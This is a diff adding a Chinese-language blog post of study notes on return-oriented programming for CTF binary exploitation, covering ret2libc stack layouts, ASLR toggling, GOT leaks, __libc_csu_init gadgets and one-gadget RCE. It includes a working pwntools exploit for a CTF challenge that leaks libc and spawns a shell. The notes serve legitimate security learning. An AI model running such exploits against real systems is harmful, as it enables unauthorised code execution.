@@ -1,0 +1,185 @@
+---
+layout: post
+title:  "Return Oriented Programming"
+categories: binary exploitation
+tags: [rop,pwn]
+---
+整理一下
+
+## 找 getgads 工具
+
+* rp++
+* ROPgadget
+
+## Ret2libc
+
+當程式有打開`NX`的時候造成 stack 上的 shellcode 無法執行，可以利用`ret2libc`或是利用ROP做`mprotect`開一個rwx的段，
+
+### 參數傳遞
+
+* x86
+    利用stack
+* x86_64
+    利用reg
+
+### Ret2libc 疊法
+
+可以盡可能的把參數疊完整，比較不會發生一些鳥問題
+
+一般x86的疊法是：
+
+```
+padding +  function + ret address + argv1 + argv2 + argv3 ....
+```
+
+一般 function 可以直接跳 `.plt` ， ret address 是執行完以後我要去的地方，假如一般疊出 system("/bin/sh")，ret address 可以直接填空沒關係
+
+例如 :
+
+```
+'A'*100 + p32(system_addr) + p32(0) + p32(binsh_addr)
+```
+
+x64:
+利用一些 `pop reg` 的getgads把reg設定好
+
+### 32 bit ROP
+
+參數直接疊在stack上，用 pop_ret 清掉用過的參數
+
+```diff
+read @ plt
+pop_pop_pop_ret
+0
+addr
+length
+system @ plt
+```
+
+### ASLR
+
+* aslr on
+```
+sudo sysctl -w kernel.randomize_va_space=2
+```
+
+* aslr off
+```
+sudo sysctl -w kernel.randomize_va_space=0
+```
+
+假如有ASLR，本的的話 32bit可以使用`ulimit -s unlimited`關閉，或是可以利用`puts`，leak `.got` 段上的資料 同一個 libc function 之間的偏移是固定的
+
+一般常出現的函數 :
+
+* __libc_start_main
+* puts
+* read
+* write
+* .....
+
+
+### DynELF
+
+假如在不知道對方libc 的情況下可以使用pwntools中的一個工具`DynELF`，給他一個leak的點，可以幫你找出function的位置
+
+
+這是313c CTF 中的 cfy 可以當作練習
+
+``` python
+from pwn import *
+import time
+
+printf_got = 0x601020
+
+def leak(addr):
+    r.sendline('2')
+    r.sendline(p64(addr) )
+    s = r.recvline_contains('hex: 0x')[5:].strip()
+    s = p64( int(s,16) )
+    return s
+
+r = remote('localhost',4000)
+
+ptr_libc = u64(leak(printf_got))
+d = DynELF(leak, ptr_libc)
+system = d.lookup('system')
+
+print r.recvuntil('quit')
+r.sendline('7')
+r.sendline('/bin/sh\x00' + 'A'*8 + p64(system) )
+
+r.interactive()
+```
+
+### x86_64
+
+* 最大地址 `0x00007fffffffffff`
+
+## x64 通用gadgets
+
+這些函數都可以利用
+
+```diff
+_init
+_start
+call_gmon_start
+deregister_tm_clones
+register_tm_clones
+__do_global_dtors_aux
+frame_dummy
+__libc_csu_init
+__libc_csu_fini
+_fini
+```
+
+
+```diff
+ROPgadget --binary ./binary --depth 100
+```
+
+不從版本 gadgets 會不太一樣，不過都可以通用，在於\_\_libc\_csu\_init()
+
+
+假如有些指令切一半的話也可以對reg做操作
+
+```diff
+<__libc_csu_init>:
+5b                       pop    rbx
+5d                       pop    rbp
+41 5c                    pop    r12   ->   pop rsp (5c)
+41 5d                    pop    r13   ->   pop rbp (5d)
+41 5e                    pop    r14   ->   pop rsi (5e)
+41 5f                    pop    r15   ->   pop rdi (5f)
+c3                       ret
+```
+
+
+```diff
+mov    rbx,QWORD PTR [rsp+0x8]
+mov    rbp,QWORD PTR [rsp+0x10]
+mov    r12,QWORD PTR [rsp+0x18]
+mov    r13,QWORD PTR [rsp+0x20]
+mov    r14,QWORD PTR [rsp+0x28]
+mov    r15,QWORD PTR [rsp+0x30]
+add    rsp,0x38
+ret
+```
+
+利用這些gadgets可以把 r12-r15 控好，`call qword ptr [r12+rbx*8]`的時候可以將`rbp等於1，rbx等於0`才會繼續ret下去，這部分可以自己跟一次比較清楚
+
+```
+4c 89 ea                 mov    rdx,r13
+4c 89 f6                 mov    rsi,r14
+44 89 ff                 mov    edi,r15d
+41 ff 14 dc              call   QWORD PTR [r12+rbx*8]
+```
+
+
+
+## One gadgets RCE
+
+在一些特定的libc中藏有可以直接執行execv("/bin/sh")，可以觀察一下libc中有用到execv的附近藏有"/bin/sh"的字串，有機會可以直接成功
+
+
+
